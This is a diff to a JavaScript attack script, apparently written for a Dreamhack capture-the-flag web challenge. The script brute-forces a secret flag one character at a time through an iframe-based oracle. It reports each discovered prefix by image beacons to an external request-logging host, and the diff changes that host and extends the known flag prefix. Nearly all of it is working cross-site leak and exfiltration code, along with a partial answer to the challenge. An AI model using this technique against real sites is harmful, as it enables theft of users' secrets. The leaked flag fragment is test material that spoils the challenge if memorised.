@@ -12,7 +12,7 @@
 <script>
     const iframe = document.getElementById("iframe");
     const chars = "abcdefghijklmnopqrstuvwxyz0123456789}";
-    let flag = "DH{22d1";
+    let flag = "DH{22d1445ad";
 
     async function searchChar(data) {
         return new Promise((resolve) => {
@@ -25,14 +25,14 @@
 
     async function findFlag() {
         // 접속 확인 신호
-        new Image().src = "https://qrnfmov.request.dreamhack.games?start=started";
+        new Image().src = "https://krxnknf.request.dreamhack.games?start=started";
 
         while (flag.length <= 40) {
             let found = false;
             for (let i = 0; i < chars.length; i++) {
                 if (await searchChar(flag + chars[i])) {
                     flag += chars[i];
-                    new Image().src = "https://qrnfmov.request.dreamhack.games?found=" + encodeURIComponent(flag);
+                    new Image().src = "https://krxnknf.request.dreamhack.games?found=" + encodeURIComponent(flag);
                     found = true;
 
                     if (chars[i] === "}") return;
@@ -40,7 +40,7 @@
                 }
             }
             if (!found) {
-                new Image().src = "https://qrnfmov.request.dreamhack.games?error=notfound";
+                new Image().src = "https://krxnknf.request.dreamhack.games?error=notfound";
                 break;
             }
         }
